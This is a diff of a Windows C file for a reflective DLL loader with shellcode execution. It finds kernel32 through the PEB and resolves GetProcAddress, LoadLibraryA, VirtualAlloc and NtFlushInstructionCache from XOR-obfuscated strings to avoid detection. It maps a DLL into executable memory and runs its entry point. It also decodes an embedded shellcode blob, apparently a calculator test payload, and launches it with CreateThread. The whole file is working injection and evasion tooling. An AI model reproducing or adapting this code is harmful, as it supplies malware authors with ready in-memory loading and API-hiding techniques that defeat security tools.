@@ -1,10 +1,14 @@
 #include <stdio.h>
 #include <Windows.h>
 
+#ifdef _M_X64
+#include "calc-thread64.bin.inc"
+#else
+#include "calc-thread32.bin.inc"
+#endif
+
 #define UTILS_IMPLEMENTATION
 #include "utils.h"
-
-#include "calc-thread64.bin.inc"
 
 typedef struct _hint_name_table_entry
 {
@@ -40,7 +44,7 @@ __declspec(dllexport) LPVOID Dump(void)
         --ulSrcDLLAddr;
     }
 
-    // Get kernel32 from the PEB
+    // Get kernel32 base addr from the PEB
     ULONG_PTR hKernelDLL = NULL;
 
 #ifdef _M_X64
@@ -48,9 +52,6 @@ __declspec(dllexport) LPVOID Dump(void)
 #else
     MY_PEB *pPeb = (MY_PEB *)__readfsdword(0x30);
 #endif
-
-    LIST_ENTRY *FirstListEntry = &pPeb->Ldr->InMemoryOrderModuleList;
-    LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;
 
     // We do not xor the filename for the sake of simplicity
     char ccKernel32[] = {0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
@@ -82,9 +83,16 @@ __declspec(dllexport) LPVOID Dump(void)
         ++j;
     }
 
+    LIST_ENTRY *FirstListEntry = &pPeb->Ldr->InMemoryOrderModuleList;
+    LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;
+
+    // Look for the loaded kernel32 dll from the table entries
     while (CurrentListEntry != FirstListEntry)
     {
-        MY_LDR_DATA_TABLE_ENTRY *TableEntry = (MY_LDR_DATA_TABLE_ENTRY *)(CurrentListEntry - 1);
+        MY_LDR_DATA_TABLE_ENTRY *TableEntry = (MY_LDR_DATA_TABLE_ENTRY *)((ULONG_PTR)CurrentListEntry - sizeof(LIST_ENTRY));
+
+        // __debugbreak();
+        // return TableEntry;
 
         BOOL bAreEqual = TRUE;
 
@@ -145,9 +153,11 @@ __declspec(dllexport) LPVOID Dump(void)
     LPVOID(WINAPI * ppVirtualAlloc)
     (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = NULL;
 
+    // Xored data of GetProcAddress function string
     char ccGetProcAddress[] = {0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0};
     const short ccGetProcAddressLen = 14;
 
+    // Un XOR data of the GetProcAddress function string
     j = 0;
     for (short i = 0; i < ccGetProcAddressLen; ++i)
     {
@@ -170,6 +180,7 @@ __declspec(dllexport) LPVOID Dump(void)
         ++j;
     }
 
+    // Look for the GetProcAddress function in the Export Table
     for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
     {
         BOOL bAreEqual = TRUE;
@@ -206,9 +217,11 @@ __declspec(dllexport) LPVOID Dump(void)
         }
     }
 
+    // XOR ed data of the LoadLibraryA function string
     char ccLoadLibraryA[] = {0x7c, 0x5f, 0x51, 0x54, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0x71, 0};
     const short ccLoadLibraryALen = 12;
 
+    // Un XOR data of the LoadLibraryA function string
     j = 0;
     for (short i = 0; i < ccLoadLibraryALen; ++i)
     {
@@ -231,6 +244,7 @@ __declspec(dllexport) LPVOID Dump(void)
         ++j;
     }
 
+    // Look for the LoadLibrary function in the Export Table
     for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
     {
         BOOL bAreEqual = TRUE;
@@ -267,9 +281,11 @@ __declspec(dllexport) LPVOID Dump(void)
         }
     }
 
+    // XOR ed data of the VirtualAlloc function string
     char ccVirtualAlloc[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0};
     const short ccVirtualAllocLen = 12;
 
+    // Un XOR data of the VirtualAlloc function string
     j = 0;
     for (short i = 0; i < ccVirtualAllocLen; ++i)
     {
@@ -292,6 +308,7 @@ __declspec(dllexport) LPVOID Dump(void)
         ++j;
     }
 
+    // Look for the VirtualAlloc function in the Export Table
     for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
     {
         BOOL bAreEqual = TRUE;
@@ -335,53 +352,11 @@ __declspec(dllexport) LPVOID Dump(void)
         }
     }
 
-    char ccNTDLL[] = {0x5e, 0x44, 0x54, 0x5c, 0x5c, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
-    const short ccNTDLLLen = 9;
-
-    // UnXor ntdll string data
-    j = 0;
-    for (short i = 0; i < ccNTDLLLen; ++i)
-    {
-        if (j == cckey_len)
-            j = 0;
-
-        BYTE bInput = 0;
-
-        for (BYTE b = 0; b < 8; ++b)
-        {
-            BYTE data_bit_i = _bittest((LONG *)&ccNTDLL[i], b);
-            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);
-
-            BYTE bit_xor = (data_bit_i != key_bit_j) << b;
-
-            bInput |= bit_xor;
-        }
-
-        ccNTDLL[i] = bInput;
-        ++j;
-    }
-
-    ULONG_PTR hNtdllDLL = (ULONG_PTR)ppLoadLibraryA(ccNTDLL);
-
-    if (hNtdllDLL == NULL)
-    {
-        return;
-    }
-
-    DosHeader = (IMAGE_DOS_HEADER *)hNtdllDLL;
-    NTHeaders = (IMAGE_NT_HEADERS *)(hNtdllDLL + DosHeader->e_lfanew);
-
-    ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(hNtdllDLL + ExportDataDirectory.VirtualAddress);
-
-    AddressOfFunctions = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfFunctions);
-    AddressOfNames = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfNames);
-    AddressOfNameOrdinals = (WORD *)(hNtdllDLL + ExportDirectory->AddressOfNameOrdinals);
-
     // Copy Section headers
     IMAGE_DOS_HEADER *SrcDosHeader = (IMAGE_DOS_HEADER *)ulSrcDLLAddr;
     IMAGE_NT_HEADERS *SrcNTHeaders = (IMAGE_NT_HEADERS *)(ulSrcDLLAddr + SrcDosHeader->e_lfanew);
 
+    // Allocate space for the "loaded" DLL
     ULONG_PTR ulDstDLLAddr = (ULONG_PTR)ppVirtualAlloc(NULL, SrcNTHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
     if (ulDstDLLAddr == NULL)
@@ -418,17 +393,17 @@ __declspec(dllexport) LPVOID Dump(void)
     }
 
     // Per DLL image descriptor
-    PMY_IMAGE_IMPORT_DESCRIPTOR pMyImageImportDescriptor = (PMY_IMAGE_IMPORT_DESCRIPTOR)(ulDstDLLAddr + DstNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(ulDstDLLAddr + DstNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
     DWORD dwImportDescriptorCount = 0;
 
-    while (!(pMyImageImportDescriptor->OriginalFirstThunk == 0 &&
-             pMyImageImportDescriptor->TimeDateStamp == 0 &&
-             pMyImageImportDescriptor->ForwarderChain == 0 &&
-             pMyImageImportDescriptor->Name == 0 &&
-             pMyImageImportDescriptor->FirstThunk == 0))
+    while (!(pImageImportDescriptor->OriginalFirstThunk == 0 &&
+             pImageImportDescriptor->TimeDateStamp == 0 &&
+             pImageImportDescriptor->ForwarderChain == 0 &&
+             pImageImportDescriptor->Name == 0 &&
+             pImageImportDescriptor->FirstThunk == 0))
     {
-        CHAR *sImportName = (CHAR *)(ulDstDLLAddr + pMyImageImportDescriptor->Name);
+        CHAR *sImportName = (CHAR *)(ulDstDLLAddr + pImageImportDescriptor->Name);
         ULONG_PTR hLoadedLibrary = (ULONG_PTR)ppLoadLibraryA(sImportName);
 
         if (hLoadedLibrary == NULL)
@@ -437,8 +412,8 @@ __declspec(dllexport) LPVOID Dump(void)
         }
 
         // process IAT
-        DWORD dwOriginalThunkRVA = pMyImageImportDescriptor->OriginalFirstThunk;
-        DWORD dwFirstThunkRVA = pMyImageImportDescriptor->FirstThunk;
+        DWORD dwOriginalThunkRVA = pImageImportDescriptor->OriginalFirstThunk;
+        DWORD dwFirstThunkRVA = pImageImportDescriptor->FirstThunk;
 
         DWORD dwHintNameTableEntryRVA = *(DWORD *)(ulDstDLLAddr + dwOriginalThunkRVA);
 
@@ -493,9 +468,52 @@ __declspec(dllexport) LPVOID Dump(void)
         }
 
         // Next IMAGE DESCRIPTOR i.e. imported DLL
-        (ULONG_PTR) pMyImageImportDescriptor += sizeof(IMAGE_IMPORT_DESCRIPTOR);
+        (ULONG_PTR) pImageImportDescriptor += sizeof(IMAGE_IMPORT_DESCRIPTOR);
         ++dwImportDescriptorCount;
     }
+
+    char ccNTDLL[] = {0x5e, 0x44, 0x54, 0x5c, 0x5c, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
+    const short ccNTDLLLen = 9;
+
+    // UnXor ntdll string data
+    j = 0;
+    for (short i = 0; i < ccNTDLLLen; ++i)
+    {
+        if (j == cckey_len)
+            j = 0;
+
+        BYTE bInput = 0;
+
+        for (BYTE b = 0; b < 8; ++b)
+        {
+            BYTE data_bit_i = _bittest((LONG *)&ccNTDLL[i], b);
+            BYTE key_bit_j = _bittest((LONG *)&cckey[j], b);
+
+            BYTE bit_xor = (data_bit_i != key_bit_j) << b;
+
+            bInput |= bit_xor;
+        }
+
+        ccNTDLL[i] = bInput;
+        ++j;
+    }
+
+    ULONG_PTR hNtdllDLL = (ULONG_PTR)ppLoadLibraryA(ccNTDLL);
+
+    if (hNtdllDLL == NULL)
+    {
+        return;
+    }
+
+    DosHeader = (IMAGE_DOS_HEADER *)hNtdllDLL;
+    NTHeaders = (IMAGE_NT_HEADERS *)(hNtdllDLL + DosHeader->e_lfanew);
+
+    ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(hNtdllDLL + ExportDataDirectory.VirtualAddress);
+
+    AddressOfFunctions = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfFunctions);
+    AddressOfNames = (DWORD *)(hNtdllDLL + ExportDirectory->AddressOfNames);
+    AddressOfNameOrdinals = (WORD *)(hNtdllDLL + ExportDirectory->AddressOfNameOrdinals);
 
     // we split the function name xored data into two buffers, since creating a buffer of more than 15 bytes zero out the data,
     // e.g. creating a buffer of 23 bytes, causes the first 16 bytes being zero.
@@ -551,6 +569,7 @@ __declspec(dllexport) LPVOID Dump(void)
         ++j;
     }
 
+    // Look for the NTFlushInstructionCache func in the Export Table
     for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
     {
         BOOL bAreEqual = TRUE;
@@ -563,7 +582,7 @@ __declspec(dllexport) LPVOID Dump(void)
             {
                 if (ccNTFlushInstructionCache[c] < cFuncName[c])
                 {
-                    if ((ccNTFlushInstruc[c] + 32) != cFuncName[c])
+                    if ((ccNTFlushInstructionCache[c] + 32) != cFuncName[c])
                     {
                         bAreEqual = FALSE;
                         break;
@@ -593,6 +612,8 @@ __declspec(dllexport) LPVOID Dump(void)
     // Find the entry point
     BOOL(WINAPI * pEntryPoint)
     (HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved) = ulDstDLLAddr + DstNTHeaders->OptionalHeader.AddressOfEntryPoint;
+
+    // __debugbreak();
 
     // Call the entry point
     pEntryPoint((HINSTANCE)ulDstDLLAddr, DLL_PROCESS_ATTACH, NULL);
@@ -636,13 +657,17 @@ void Go(void)
 
     pMessageBoxA(NULL, "Caption", "Text", MB_OK);
 
+#ifdef _M_X64
     lpvPayload = pVirtualAlloc(NULL, calc64_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+#else
+    lpvPayload = pVirtualAlloc(NULL, calc32_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+#endif
 
     if (lpvPayload == NULL)
     {
         goto shutdown;
     }
-
+#ifdef _M_X64
     MyXor(calc64_data, calc64_data_len, key, key_len);
     MyMemCpy(lpvPayload, calc64_data, calc64_data_len);
 
@@ -651,6 +676,16 @@ void Go(void)
     {
         goto shutdown;
     }
+#else
+    MyXor(calc32_data, calc32_data_len, key, key_len);
+    MyMemCpy(lpvPayload, calc32_data, calc32_data_len);
+
+    DWORD dwOldProtect = 0;
+    if (!pVirtualProtect(lpvPayload, calc32_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
+    {
+        goto shutdown;
+    }
+#endif
 
     HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpvPayload, NULL, 0, NULL);
     if (hThread != NULL)
@@ -673,13 +708,7 @@ BOOL WINAPI DllMain(HINSTANCE hInstanceDLL, DWORD dwReason, LPVOID lpvReserved)
     switch (dwReason)
     {
     case DLL_PROCESS_ATTACH:
-        Go();
-        break;
-
-    case DLL_THREAD_ATTACH:
-        break;
-
-    case DLL_THREAD_DETACH:
+        // Go();
         break;
 
     case DLL_PROCESS_DETACH:
